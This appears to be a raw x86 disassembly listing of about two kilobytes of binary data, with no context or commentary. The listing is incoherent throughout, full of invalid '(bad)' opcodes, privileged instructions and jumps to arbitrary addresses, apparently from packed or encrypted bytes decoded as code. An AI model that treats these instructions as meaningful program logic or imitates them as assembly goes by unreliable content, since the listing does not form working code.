  41a2a3:	pop    ebx
  41a2a4:	xor    BYTE PTR [edx],0x8d
  41a2a7:	adc    DWORD PTR [edx+0x680cdc7b],esi
  41a2ad:	mov    dl,0x60
  41a2af:	push   ebx
  41a2b0:	jbe    0x41a2e9
  41a2b2:	xchg   ecx,eax
  41a2b3:	xor    eax,0x17536cbf
  41a2b8:	ficomp WORD PTR [esi-0x73e47d7e]
  41a2be:	(bad)  
  41a2bf:	fdivr  st,st(5)
  41a2c1:	fidivr WORD PTR [eax-0x5d]
  41a2c4:	imul   edi,DWORD PTR [edi],0xfffffffa
  41a2c7:	aaa    
  41a2c8:	cmc    
  41a2c9:	mov    esp,0x483c3606
  41a2ce:	and    ch,BYTE PTR [ebp-0x3d]
  41a2d1:	xchg   esp,eax
  41a2d2:	ins    BYTE PTR es:[edi],dx
  41a2d3:	cs push esi
  41a2d5:	dec    ecx
  41a2d6:	mov    bl,0x14
  41a2d8:	(bad)  
  41a2d9:	out    dx,al
  41a2da:	cmp    al,0x83
  41a2dc:	ss inc ebx
  41a2de:	test   al,0xd1
  41a2e0:	mov    ecx,0xd463a87a
  41a2e5:	push   ds
  41a2e6:	retf   0x6900
  41a2e9:	retf   0xe524
  41a2ec:	xchg   edx,ebx
  41a2ee:	das    
  41a2ef:	or     dl,BYTE PTR [esi]
  41a2f1:	cli    
  41a2f2:	mov    edx,0x48d3b3
  41a2f7:	aam    0xd3
  41a2f9:	mov    ah,0xc0
  41a2fb:	inc    edx
  41a2fc:	cmp    eax,0xc335938f
  41a301:	and    al,0xf1
  41a303:	inc    edi
  41a304:	pop    esi
  41a305:	xor    BYTE PTR [eax],cl
  41a307:	xchg   edx,eax
  41a308:	mov    ds:0x8acdc668,eax
  41a30d:	stos   BYTE PTR es:[edi],al
  41a30e:	dec    eax
  41a30f:	(bad)  
  41a310:	adc    al,0x6d
  41a312:	(bad)  
  41a313:	mov    bl,0xa9
  41a315:	mov    edi,0xae928627
  41a31a:	dec    eax
  41a31b:	je     0x41a33a
  41a31d:	adc    al,0x81
  41a31f:	and    al,0x33
  41a321:	out    0xd,al
  41a323:	ret    
  41a324:	pop    ebx
  41a325:	icebp  
  41a326:	mov    al,0x3
  41a328:	ficom  WORD PTR [ebx+0x66]
  41a32b:	push   0xffffffc0
  41a32d:	sub    al,0xde
  41a32f:	xor    ch,bl
  41a331:	adc    DWORD PTR [ebp-0x21],0x6cdf5323
  41a338:	xor    BYTE PTR [edi-0x45],0xb2
  41a33c:	sub    dh,BYTE PTR [ecx-0x28f9530a]
  41a342:	mov    BYTE PTR [ebx],cl
  41a344:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a345:	daa    
  41a346:	sbb    dh,ch
  41a348:	lods   eax,DWORD PTR ds:[esi]
  41a349:	pusha  
  41a34a:	add    edx,DWORD PTR [ebp-0xe02777f]
  41a350:	ins    DWORD PTR es:[edi],dx
  41a351:	xchg   ebx,eax
  41a352:	inc    esp
  41a353:	gs cmp eax,0x9b82d6b8
  41a359:	test   eax,0x76bebe94
  41a35e:	inc    edi
  41a35f:	stos   BYTE PTR es:[edi],al
  41a360:	mov    eax,0x6f0a5ec8
  41a365:	lea    ebx,ds:0xfdb211da
  41a36b:	jne    0x41a352
  41a36d:	jb     0x41a362
  41a36f:	sbb    bl,cl
  41a371:	sub    al,0x49
  41a373:	add    ebp,DWORD PTR [ebp+eiz*8-0x5843cfcb]
  41a37a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a37b:	loopne 0x41a323
  41a37d:	mov    ch,0xb5
  41a37f:	xor    BYTE PTR [edx-0x5437598e],ah
  41a385:	test   DWORD PTR [ecx-0x71d1224d],esi
  41a38b:	push   0x9
  41a38d:	inc    esi
  41a38e:	xchg   ch,ch
  41a390:	test   eax,0x2752b465
  41a395:	adc    eax,0xb7d6f6ca
  41a39a:	sti    
  41a39b:	lock mov ds:0x2d9a26da,eax
  41a3a1:	(bad)  
  41a3a2:	mov    ch,0x3f
  41a3a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a3a5:	xor    dh,ah
  41a3a7:	loopne 0x41a398
  41a3a9:	sahf   
  41a3aa:	aas    
  41a3ab:	(bad)  
  41a3ac:	mov    eax,0xcd98b8b7
  41a3b1:	(bad)  
  41a3b2:	mov    dl,BYTE PTR [edi-0x660ba5ab]
  41a3b8:	and    eax,0x3829624
  41a3bd:	mov    ds:0x69923e09,al
  41a3c2:	aad    0xcb
  41a3c4:	pushf  
  41a3c5:	xor    eax,0xcfb70e49
  41a3ca:	pop    ebp
  41a3cb:	lahf   
  41a3cc:	out    0x3b,al
  41a3ce:	jb     0x41a3e0
  41a3d0:	xchg   edi,eax
  41a3d1:	add    eax,0xd2e5132d
  41a3d6:	jnp    0x41a3c6
  41a3d8:	cld    
  41a3d9:	int3   
  41a3da:	ror    DWORD PTR [ecx+0x1d9e05ea],0xda
  41a3e1:	xchg   BYTE PTR [edx-0x7a],al
  41a3e4:	icebp  
  41a3e5:	sub    DWORD PTR [edi-0x24],esp
  41a3e8:	pop    esp
  41a3e9:	ficom  DWORD PTR [edi]
  41a3eb:	xlat   BYTE PTR ds:[ebx]
  41a3ec:	ret    
  41a3ed:	jmp    0x9526ca1d
  41a3f2:	std    
  41a3f3:	(bad)  
  41a3f4:	pushf  
  41a3f5:	xor    BYTE PTR [ecx+0x37],bl
  41a3f8:	or     DWORD PTR [esi-0x56],ebx
  41a3fb:	sub    al,0xb6
  41a3fd:	aaa    
  41a3fe:	pop    es
  41a3ff:	sub    edx,esp
  41a401:	addr16 inc edx
  41a403:	rcr    BYTE PTR [edx-0x3a9d53e4],0xcb
  41a40a:	xor    cl,al
  41a40c:	dec    esi
  41a40d:	push   0x93ab1e99
  41a412:	or     ecx,edx
  41a414:	cwde   
  41a415:	mov    ch,0x27
  41a417:	mov    ah,0x8f
  41a419:	push   es
  41a41a:	sub    eax,0x2a6f571d
  41a41f:	rcl    DWORD PTR [edi],0xeb
  41a422:	repnz pop es
  41a424:	sbb    ah,BYTE PTR [ebx-0x3937eead]
  41a42a:	(bad)  
  41a42b:	mov    al,ds:0x93972c62
  41a430:	or     esi,DWORD PTR [ebp-0x28]
  41a433:	mov    al,0xa8
  41a435:	hlt    
  41a436:	clc    
  41a437:	push   0x7a
  41a439:	mov    DWORD PTR [ebx],ebx
  41a43b:	pop    ss
  41a43c:	je     0x41a4b0
  41a43e:	inc    edi
  41a43f:	pop    ebp
  41a440:	pop    edx
  41a441:	xlat   BYTE PTR ds:[ebx]
  41a442:	out    dx,al
  41a443:	inc    eax
  41a444:	pop    esp
  41a445:	push   edi
  41a446:	mov    cl,0x2e
  41a448:	mov    ds:0x497e9f9a,eax
  41a44d:	jae    0x41a3e5
  41a44f:	mov    dl,0xcf
  41a451:	daa    
  41a452:	push   0xd5b49172
  41a457:	std    
  41a458:	push   edx
  41a459:	and    al,0xc0
  41a45b:	mov    dl,0x18
  41a45d:	stos   DWORD PTR es:[edi],eax
  41a45e:	mov    ebp,0x824b1913
  41a463:	scas   al,BYTE PTR es:[edi]
  41a464:	jmp    0x9620:0x28b3977c
  41a46b:	jbe    0x41a4ea
  41a46d:	and    al,0xa
  41a46f:	frstor [ebp-0x70ca00eb]
  41a475:	gs fs aad 0x39
  41a479:	ficomp DWORD PTR ds:0x1d6cf482
  41a47f:	sbb    DWORD PTR [ebp+0x6b],esi
  41a482:	sar    BYTE PTR [edx+0x432a080f],cl
  41a488:	(bad)  
  41a489:	adc    al,al
  41a48b:	add    ch,BYTE PTR [eax+ebp*4+0x7e]
  41a48f:	pop    ss
  41a490:	imul   ecx,DWORD PTR [eax],0x19e8398f
  41a496:	(bad)  
  41a497:	popa   
  41a498:	retf   
  41a499:	adc    DWORD PTR [eax],ebx
  41a49b:	mov    ds:0x4df58de1,al
  41a4a0:	pop    esi
  41a4a1:	ss je  0x41a452
  41a4a4:	wrmsr  
  41a4a6:	lods   al,BYTE PTR ds:[esi]
  41a4a7:	sbb    BYTE PTR [edx-0x53],0x0
  41a4ab:	mov    dh,0xfd
  41a4ad:	test   eax,0x6ca45f30
  41a4b2:	or     bl,ah
  41a4b4:	ror    DWORD PTR [eax-0x1a],0xb4
  41a4b8:	std    
  41a4b9:	fisubr WORD PTR [ebp-0x4c]
  41a4bc:	sbb    al,0x6f
  41a4be:	icebp  
  41a4bf:	or     eax,edi
  41a4c1:	div    DWORD PTR [eax+eax*2+0x400f7cb8]
  41a4c8:	xchg   edx,eax
  41a4c9:	ror    DWORD PTR [ebp-0x365221f4],1
  41a4cf:	ret    0xf4ad
  41a4d2:	jb     0x41a4f5
  41a4d4:	jmp    0xeebe0f90
  41a4d9:	ss sbb al,0x5a
  41a4dc:	mov    edx,0x8bb7a8ba
  41a4e1:	rol    DWORD PTR [ecx],cl
  41a4e3:	int    0x77
  41a4e5:	cmp    eax,DWORD PTR [eax-0x6052479]
  41a4eb:	mov    dh,0x3e
  41a4ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a4ee:	pop    ebx
  41a4ef:	mov    cl,0x7a
  41a4f1:	mov    esi,0xf53d113b
  41a4f6:	push   edx
  41a4f7:	les    edi,FWORD PTR [esi+edx*2-0x57e652b4]
  41a4fe:	imul   edx,DWORD PTR [ebp+edx*1-0x5f7d4524],0xaaa1658
  41a509:	push   ss
  41a50a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a50b:	jno    0x41a4c9
  41a50d:	out    dx,al
  41a50e:	enter  0x1db0,0x47
  41a512:	(bad)  
  41a514:	add    eax,0x1877c5ab
  41a519:	test   DWORD PTR [esi+0x37],ecx
  41a51c:	and    ch,dh
  41a51e:	push   ebx
  41a51f:	lods   eax,DWORD PTR ds:[esi]
  41a520:	mov    ?,WORD PTR [ebx-0x67]
  41a523:	and    BYTE PTR [ebp+0x1a],0xa1
  41a527:	mov    eax,0x2a380c1a
  41a52c:	push   esi
  41a52d:	hlt    
  41a52e:	ss pop edi
  41a530:	xor    al,BYTE PTR [ebp+0x16]
  41a533:	jno    0x41a578
  41a535:	pop    esp
  41a536:	fisub  WORD PTR [ebp-0x7e5a6a37]
  41a53c:	aad    0x1
  41a53e:	and    al,0xc
  41a540:	sbb    edx,edi
  41a542:	jge    0x41a521
  41a544:	jge    0x41a53d
  41a546:	inc    esi
  41a547:	xor    ecx,DWORD PTR [esi]
  41a549:	repnz daa 
  41a54b:	pop    esp
  41a54c:	sub    al,dh
  41a54e:	add    ebx,DWORD PTR [edx-0x48d16d51]
  41a554:	imul   eax,DWORD PTR [ebp-0x5],0xfd180d39
  41a55b:	inc    edx
  41a55c:	(bad)  
  41a55e:	mov    al,ds:0x5bf827ff
  41a563:	sub    ebx,DWORD PTR [ebx+ebx*8]
  41a566:	mov    ds:0x4b98c342,al
  41a56b:	pusha  
  41a56c:	(bad)  
  41a56d:	test   al,0xbb
  41a56f:	adc    ebp,DWORD PTR [esi+0x1]
  41a572:	mov    eax,ds:0xa38de0ff
  41a577:	inc    DWORD PTR [ebx-0x5a]
  41a57a:	sti    
  41a57b:	inc    esi
  41a57c:	sub    DWORD PTR [ecx],ecx
  41a57e:	pop    ss
  41a57f:	pop    ebx
  41a580:	xchg   esi,eax
  41a581:	cmp    BYTE PTR [edx],0xe4
  41a584:	test   BYTE PTR [edx+0x14],0xa8
  41a588:	into   
  41a589:	mov    dh,BYTE PTR [eax]
  41a58b:	inc    ebx
  41a58c:	out    0x6c,al
  41a58e:	mul    DWORD PTR [edx]
  41a590:	lods   al,BYTE PTR ds:[esi]
  41a591:	pop    ds
  41a592:	hlt    
  41a593:	daa    
  41a594:	lock ja 0x41a5e2
  41a597:	loopne 0x41a5f8
  41a599:	push   edx
  41a59a:	ficomp DWORD PTR [ebx+ebp*8-0x1a]
  41a59e:	and    BYTE PTR [edi+0x4e],ah
  41a5a1:	mov    esi,0x460edd84
  41a5a6:	xchg   BYTE PTR [edx+0x2a2d35a9],bh
  41a5ac:	push   ebx
  41a5ad:	aam    0x5f
  41a5af:	rcr    cl,0xe5
  41a5b2:	add    BYTE PTR [eax+0x25],bh
  41a5b5:	fisubr DWORD PTR [eiz*8-0x44df67bd]
  41a5bc:	dec    esi
  41a5bd:	sub    BYTE PTR [ebx-0x1b],0x1c
  41a5c1:	jmp    DWORD PTR [edx-0x150f169]
  41a5c7:	std    
  41a5c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a5c9:	xor    al,0xa9
  41a5cb:	sub    al,0xb8
  41a5cd:	and    al,0x5a
  41a5cf:	xor    esp,DWORD PTR [ebx-0x338dcf63]
  41a5d5:	sub    al,0xe7
  41a5d7:	test   DWORD PTR [ebx],ebx
  41a5d9:	fist   WORD PTR [esi+ebp*8+0x21]
  41a5dd:	pop    esp
  41a5de:	test   al,0x92
  41a5e0:	sub    ebx,DWORD PTR [eax-0x1951da9a]
  41a5e6:	repnz (bad) es:[edx]
  41a5eb:	icebp  
  41a5ec:	xchg   ebp,eax
  41a5ed:	cmp    DWORD PTR [esi],ecx
  41a5ef:	les    ecx,FWORD PTR [ecx+0x35]
  41a5f2:	push   es
  41a5f3:	(bad)  
  41a5f4:	jg     0x41a636
  41a5f6:	cwde   
  41a5f7:	lds    ebx,FWORD PTR [esp+ebx*8+0x9e7c443]
  41a5fe:	arpl   WORD PTR [edx+0x49b8f3d0],bp
  41a604:	(bad)  
  41a605:	(bad)  gs:[ecx-0x18]
  41a609:	lods   eax,DWORD PTR ds:[esi]
  41a60a:	sub    al,0x89
  41a60c:	rol    ebp,cl
  41a60e:	in     eax,0xd4
  41a610:	and    esp,DWORD PTR [ecx]
  41a612:	bound  ebx,QWORD PTR [esi-0x19e896fb]
  41a618:	and    ah,BYTE PTR [edx+0x73]
  41a61b:	test   BYTE PTR [edi-0x59fb7f0f],bh
  41a621:	push   edi
  41a622:	mov    DWORD PTR cs:[edx],0xc7787e30
  41a629:	mov    edx,0x1bd09ed3
  41a62e:	mov    ebp,0xf77003b2
  41a633:	mov    BYTE PTR [esi+edi*8+0x0],dl
  41a637:	fisttp WORD PTR [ebx+0x45]
  41a63a:	mov    eax,ds:0x24d823a2
  41a63f:	jle    0x41a62d
  41a641:	mov    ebp,es
  41a643:	push   eax
  41a644:	sbb    DWORD PTR es:[esi],edx
  41a647:	xor    ch,al
  41a649:	lds    eax,FWORD PTR [ebp+0x39]
  41a64c:	mov    dl,0x7
  41a64e:	es out dx,al
  41a650:	or     cl,dl
  41a652:	inc    eax
  41a653:	repnz xor al,0x45
  41a656:	fcom   QWORD PTR [eax-0x3a]
  41a659:	dec    eax
  41a65a:	mov    edx,DWORD PTR [edi]
  41a65c:	rcr    DWORD PTR [esi+0x375b8848],cl
  41a662:	ins    DWORD PTR es:[edi],dx
  41a663:	mov    ebp,0xf407cf0f
  41a668:	jmp    0x41a692
  41a66a:	cmp    BYTE PTR [ebp-0xa],dl
  41a66d:	in     eax,0x3b
  41a66f:	inc    esp
  41a670:	xlat   BYTE PTR ds:[ebx]
  41a671:	js     0x41a66d
  41a673:	clc    
  41a674:	add    DWORD PTR [ebx+0x69],edi
  41a677:	enter  0xd3fb,0xae
  41a67b:	ja     0x41a64b
  41a67d:	xchg   DWORD PTR [esi+0x27012b27],esp
  41a683:	scas   eax,DWORD PTR es:[edi]
  41a684:	sub    edx,DWORD PTR ds:0xb0fc5b6f
  41a68a:	call   0xedce022
  41a68f:	not    DWORD PTR [eax]
  41a691:	sub    eax,0x9256041
  41a696:	fidiv  DWORD PTR [esi]
  41a698:	js     0x41a704
  41a69a:	inc    esp
  41a69b:	popf   
  41a69c:	sbb    al,0xf1
  41a69e:	fwait
  41a69f:	add    BYTE PTR [edi+0x7a3c010a],ch
  41a6a5:	rcr    DWORD PTR [edi-0x43],1
  41a6a8:	aad    0x35
  41a6aa:	cmp    dl,BYTE PTR [ecx-0x6f2a291d]
  41a6b0:	push   ecx
  41a6b1:	mov    ds:0xac620fc5,al
  41a6b6:	xor    eax,0x5f1722bc
  41a6bb:	xchg   ebp,eax
  41a6bc:	fwait
  41a6bd:	dec    eax
  41a6be:	pop    ss
  41a6bf:	lahf   
  41a6c0:	mov    edi,0x7fb730f2
  41a6c5:	dec    ebp
  41a6c6:	jecxz  0x41a6e3
  41a6c8:	leave  
  41a6c9:	aaa    
  41a6ca:	mov    BYTE PTR [eax],cl
  41a6cc:	(bad)  
  41a6cd:	stc    
  41a6ce:	dec    esi
  41a6cf:	sub    eax,0xd6dc25f3
  41a6d4:	pop    esi
  41a6d5:	jg     0x41a71b
  41a6d7:	jb     0x41a66f
  41a6d9:	mov    ds:0x26fe1c98,al
  41a6de:	lods   al,BYTE PTR ds:[esi]
  41a6df:	aam    0x6e
  41a6e1:	mov    esp,0xb36386dd
  41a6e6:	cmp    esp,DWORD PTR [esi+0x6505d712]
  41a6ec:	inc    edx
  41a6ed:	and    ch,dl
  41a6ef:	mov    bh,0xda
  41a6f1:	jge    0x41a6a6
  41a6f3:	mov    dl,BYTE PTR ds:0x2c37e586
  41a6f9:	sub    esi,DWORD PTR [esi-0x375367ad]
  41a6ff:	fadd   st,st(3)
  41a701:	mov    ds:0x90b2c984,al
  41a706:	std    
  41a707:	mov    gs:0xadfb7dee,eax
  41a70d:	shr    bh,cl
  41a70f:	add    BYTE PTR [ecx+0x6d913086],al
  41a715:	sysexit 
  41a717:	mov    dl,0x31
  41a719:	addr16 pop esi
  41a71b:	jno    0x41a6b1
  41a71d:	or     edx,DWORD PTR [ecx-0x50fbd472]
  41a723:	inc    ebx
  41a724:	jo     0x41a74c
  41a726:	call   0x4904c371
  41a72b:	cs in  al,0x80
  41a72e:	mov    cl,0x68
  41a730:	dec    esp
  41a731:	stos   DWORD PTR es:[edi],eax
  41a732:	sbb    ebx,0xefacf37b
  41a738:	xor    DWORD PTR [edi-0x2a9c5d14],ebp
  41a73e:	daa    
  41a73f:	and    eax,0x2e4cc80
  41a744:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a745:	dec    esp
  41a746:	outs   dx,DWORD PTR ds:[esi]
  41a747:	popf   
  41a748:	lods   eax,DWORD PTR ds:[esi]
  41a749:	arpl   di,sp
  41a74b:	sti    
  41a74c:	sbb    BYTE PTR [ecx-0x58],dh
  41a74f:	in     al,0x4d
  41a751:	retf   
  41a752:	aaa    
  41a753:	and    bl,ch
  41a755:	out    dx,eax
  41a756:	mov    ch,0x5d
  41a758:	je     0x41a78d
  41a75a:	inc    esp
  41a75b:	cli    
  41a75c:	inc    esp
  41a75d:	mov    al,0x89
  41a75f:	sub    ecx,DWORD PTR es:0x6655b4d8
  41a766:	dec    esp
  41a767:	loopne 0x41a7cb
  41a769:	pop    esp
  41a76a:	lds    edi,FWORD PTR [ebp-0x33ba648b]
  41a770:	neg    BYTE PTR [edi-0x40]
  41a773:	mov    ds:0x13d7d45d,eax
  41a778:	js     0x41a796
  41a77a:	stc    
  41a77b:	pop    esi
  41a77c:	add    dl,BYTE PTR [eax]
  41a77e:	into   
  41a77f:	cmp    eax,0x22b1a6ed
  41a784:	add    ch,cl
  41a786:	sub    ebx,DWORD PTR [esi]
  41a788:	or     al,0xf0
  41a78a:	push   eax
  41a78b:	sub    DWORD PTR [ebx],ebx
  41a78d:	das    
  41a78e:	les    ecx,FWORD PTR [eiz*8-0x681a3170]
  41a795:	sub    ebx,edi
  41a797:	aam    0xaa
  41a799:	pop    esp
  41a79a:	dec    ebp
  41a79b:	jmp    0x8e767b5e
  41a7a0:	cmp    ah,BYTE PTR ds:0x214aae29
  41a7a6:	ja     0x41a808
  41a7a8:	into   
  41a7a9:	fadd   DWORD PTR [edx-0x2fafb15]
  41a7af:	xlat   BYTE PTR ds:[ebx]
  41a7b0:	icebp  
  41a7b1:	dec    ebp
  41a7b2:	jmp    0x56da2c81
  41a7b7:	outs   dx,DWORD PTR ds:[esi]
  41a7b8:	pop    eax
  41a7b9:	xchg   edi,eax
  41a7ba:	and    ebp,edx
  41a7bc:	das    
  41a7bd:	daa    
  41a7be:	mov    ds:0x11d2b3b3,eax
  41a7c3:	xchg   BYTE PTR [edx+0x13aaf9f8],al
  41a7c9:	or     DWORD PTR [ebx-0x5c821b1e],0x75
  41a7d0:	rcr    BYTE PTR [ecx+ecx*2+0x16],cl
  41a7d4:	lods   eax,DWORD PTR ds:[esi]
  41a7d5:	dec    ebp
  41a7d6:	ja     0x41a80b
  41a7d8:	(bad)  
  41a7d9:	repnz enter 0xb8cf,0x35
  41a7de:	xor    al,0x21
  41a7e0:	push   esi
  41a7e1:	jb     0x41a7d2
  41a7e3:	int3   
  41a7e4:	jbe    0x41a7d3
  41a7e6:	mov    al,0xa7
  41a7e8:	sbb    edi,edx
  41a7ea:	ror    BYTE PTR [ebp+0x6798efe1],0xcd
  41a7f1:	(bad)  
  41a7f2:	fcmove st,st(2)
  41a7f4:	out    0x2d,eax
  41a7f6:	mov    esp,0xed9e1f
  41a7fb:	mov    ds:0x5d87c702,al
  41a800:	jp     0x41a7af
  41a802:	mov    ecx,0x9da9219f
  41a807:	ins    BYTE PTR es:[edi],dx
  41a808:	ret    
  41a809:	inc    eax
  41a80a:	mov    ds,edx
  41a80c:	out    dx,eax
  41a80d:	outs   dx,DWORD PTR ds:[esi]
  41a80e:	and    BYTE PTR [eax],0xc0
  41a811:	add    ch,al
  41a813:	jb     0x41a7e7
  41a815:	mov    dl,0xb5
  41a817:	call   eax
  41a819:	adc    esi,esp
  41a81b:	dec    ebp
  41a81c:	cmc    
  41a81d:	out    dx,eax
  41a81e:	retf   0xcea6
  41a821:	sar    esp,0x16
  41a824:	or     ch,BYTE PTR [esi-0xc]
  41a827:	in     al,0x16
  41a829:	scas   al,BYTE PTR es:[edi]
  41a82a:	xor    eax,0xb7104598
  41a82f:	fmul   DWORD PTR [esi-0x69]
  41a832:	shl    DWORD PTR [ebx],0x86
  41a835:	jb     0x41a867
  41a837:	inc    eax
  41a838:	push   0xda36b62d
  41a83d:	pop    ecx
  41a83e:	xlat   BYTE PTR ds:[ebx]
  41a83f:	js     0x41a821
  41a841:	sub    BYTE PTR [edi-0x49562579],0x7f
  41a848:	into   
  41a849:	add    edx,DWORD PTR ds:0x2bf43808
  41a84f:	or     al,0xfe
  41a851:	or     cl,BYTE PTR [ebp-0x76]
  41a854:	sub    al,0x4c
  41a856:	fisttp QWORD PTR [ebx+eax*1+0x5bd7467c]
  41a85d:	clc    
  41a85e:	out    dx,eax
  41a85f:	pop    ebx
  41a860:	mov    edx,0xabbb6f22
  41a865:	in     eax,0x89
  41a867:	jmp    0x3db24cbf
  41a86c:	mov    edx,0x6d9e7c76
  41a871:	or     al,dl
  41a873:	sbb    al,0xd0
  41a875:	xchg   ecx,eax
  41a876:	sbb    eax,0x94ec851f
  41a87b:	aad    0x50
  41a87d:	imul   edx,ebx,0xe13630f6
  41a883:	dec    ebx
  41a884:	fstp   QWORD PTR cs:[ebx+ecx*2+0x30]
  41a889:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  41a88b:	shl    DWORD PTR [edx+0x25],1
  41a88e:	cmp    eax,0x7f545a4b
  41a893:	nop
  41a894:	jle    0x41a8e7
  41a896:	ins    DWORD PTR es:[edi],dx
  41a897:	stc    
  41a898:	jp     0x41a88d
  41a89a:	mov    eax,ds:0xe9cf9d4c
  41a89f:	hlt    
  41a8a0:	sub    BYTE PTR [esi+0x42],dh
  41a8a3:	outs   dx,DWORD PTR ds:[esi]
  41a8a4:	dec    ebp
  41a8a5:	das    
  41a8a6:	ret    0x9afb
  41a8a9:	(bad)  [ecx+eiz*1]
  41a8ac:	icebp  
  41a8ad:	mov    bl,bl
  41a8af:	push   ebx
  41a8b0:	mov    eax,0x73f85e8b
  41a8b5:	mov    dl,0x7d
  41a8b7:	xchg   eax,ebp
  41a8b9:	into   
  41a8ba:	sti    
  41a8bb:	je     0x41a89b
  41a8bd:	jl     0x41a840
  41a8bf:	ret    
  41a8c0:	test   BYTE PTR [ecx],ah
  41a8c2:	jnp    0x41a90d
  41a8c4:	int3   
  41a8c5:	pusha  
  41a8c6:	ss ins DWORD PTR es:[edi],dx
  41a8c8:	ret    
  41a8c9:	xchg   edx,eax
  41a8ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a8cb:	mov    bl,0xbc
  41a8cd:	xchg   edi,eax
  41a8ce:	jle    0x41a91d
  41a8d0:	repz add DWORD PTR [ecx-0x720eca00],esi
  41a8d7:	push   edx
  41a8d8:	ins    BYTE PTR es:[edi],dx
  41a8d9:	js     0x41a89a
  41a8db:	(bad)  
  41a8dc:	sub    eax,0x21a00f4e
  41a8e1:	cld    
  41a8e2:	iret   
  41a8e3:	or     edi,DWORD PTR [eax]
  41a8e5:	outs   dx,BYTE PTR ds:[esi]
  41a8e6:	retf   
  41a8e7:	call   0x6430:0x4bafdd69
  41a8ee:	push   eax
  41a8ef:	add    edx,0xffffff88
  41a8f2:	add    BYTE PTR [edx-0x7a1979cd],ah
  41a8f8:	jne    0x41a90c
  41a8fa:	sub    DWORD PTR [eax+0x13646957],edx
  41a900:	fist   DWORD PTR [eax]
  41a902:	cmovle eax,DWORD PTR [esi+0x124743a7]
  41a909:	jae    0x41a8f9
  41a90b:	push   edi
  41a90c:	sbb    al,BYTE PTR [ecx]
  41a90e:	les    edi,FWORD PTR [ecx]
  41a910:	lods   eax,DWORD PTR ds:[esi]
  41a911:	nop
  41a912:	cmp    dh,BYTE PTR [ecx-0x1ec3844a]
  41a918:	pop    edi
  41a919:	mov    WORD PTR [edx-0x6b],ss
  41a91c:	cmp    al,ch
  41a91e:	adc    ecx,DWORD PTR [ecx+0x504b4086]
  41a924:	add    edi,DWORD PTR ds:0x8daed8aa
  41a92a:	pop    esi
  41a92b:	xchg   ecx,eax
  41a92c:	dec    esp
  41a92d:	dec    ebp
  41a92e:	mov    cl,0xda
  41a930:	dec    eax
  41a931:	sub    eax,0x6cc40c88
  41a936:	jmp    0x41a916
  41a938:	(bad)  
  41a939:	popa   
  41a93a:	mov    WORD PTR [ecx],ds
  41a93c:	push   eax
  41a93d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a93e:	pop    ebx
  41a93f:	test   BYTE PTR [esi],bl
  41a941:	out    0x3f,eax
  41a943:	imul   ebp,DWORD PTR [edx-0x3],0x9c2c58f3
  41a94a:	dec    edx
  41a94b:	shl    DWORD PTR ds:0x65c60629,1
  41a951:	clc    
  41a952:	icebp  
  41a953:	xchg   ecx,eax
  41a954:	nop
  41a955:	sub    al,0xcc
  41a957:	adc    DWORD PTR [edi+0x4f],esi
  41a95a:	lahf   
  41a95b:	outs   dx,BYTE PTR ds:[esi]
  41a95c:	inc    ebp
  41a95d:	jp     0x41a924
  41a95f:	mov    bh,0xb
  41a961:	lahf   
  41a962:	popa   
  41a963:	test   BYTE PTR [ebx+ecx*8-0x5a29b8cd],ch
  41a96a:	cmp    eax,0x73f28f42
  41a96f:	dec    ebp
  41a970:	nop
  41a971:	add    eax,0xad57cf06
  41a976:	xchg   esp,eax
  41a977:	popw   es
  41a979:	mov    al,0xed
  41a97b:	adc    eax,0xacbf8065
  41a980:	arpl   WORD PTR [ebx],sp
  41a982:	push   es
  41a983:	push   ds
  41a984:	es retf 
  41a986:	and    eax,0xed43cf48
  41a98b:	retf   0xa59c
  41a98e:	dec    edx
  41a98f:	adc    esp,DWORD PTR [eax]
  41a991:	sub    eax,0x2450f987
  41a996:	pop    esi
  41a997:	jae    0x41a9d5
  41a999:	xchg   edx,eax
  41a99a:	sbb    al,bh
  41a99c:	enter  0xca5c,0x27
  41a9a0:	and    eax,0x48131669
  41a9a5:	sub    eax,0x8b7a3d84
  41a9aa:	dec    ebp
  41a9ab:	addr16 call 0xac35:0x3f0fba7e
  41a9b3:	rol    BYTE PTR [eax],0xac
  41a9b6:	sbb    ebp,eax
  41a9b8:	xchg   ebx,eax
  41a9b9:	in     al,0x89
  41a9bb:	pop    ss
  41a9bc:	adc    ebx,ebx
  41a9be:	sbb    al,0xe5
  41a9c0:	stos   BYTE PTR es:[edi],al
  41a9c1:	add    eax,0xdbef2c8b
  41a9c6:	and    dl,BYTE PTR [ecx+0x56]
  41a9c9:	mov    cl,0x95
  41a9cb:	ficom  DWORD PTR [eax-0x6a]
  41a9ce:	fisttp QWORD PTR [esi]
  41a9d0:	ins    BYTE PTR es:[edi],dx
  41a9d1:	jno    0x41a9c4
  41a9d3:	add    BYTE PTR [esi+edi*2+0x46],ch
  41a9d7:	inc    ecx
  41a9d8:	sbb    ebx,eax
  41a9da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a9db:	xor    esi,DWORD PTR [edx-0x80]
  41a9de:	out    dx,al
  41a9df:	out    0xca,al
  41a9e1:	push   0xf5b7a52c
  41a9e6:	mov    edi,0x5996f7e4
  41a9eb:	cwde   
  41a9ec:	fs int3 
  41a9ee:	dec    esp
  41a9ef:	out    dx,eax
  41a9f0:	push   ds
  41a9f1:	or     dl,dl
  41a9f3:	cdq    
  41a9f4:	add    bl,BYTE PTR [ecx-0x27]
  41a9f7:	sbb    eax,0x541f4006
  41a9fc:	addr16 or dh,cl
  41a9ff:	xor    DWORD PTR [ebx+0x7ebb099b],edi
  41aa05:	pop    ds
  41aa06:	scas   al,BYTE PTR es:[edi]
  41aa07:	jecxz  0x41a9ad
  41aa09:	ins    BYTE PTR es:[edi],dx
  41aa0a:	inc    eax
  41aa0b:	loopne 0x41aa82
  41aa0d:	jmp    0x41aa89
  41aa0f:	mov    dh,0xfa
  41aa11:	in     al,0x90
  41aa13:	adc    BYTE PTR [ecx],al
  41aa15:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aa16:	mov    ch,0x52
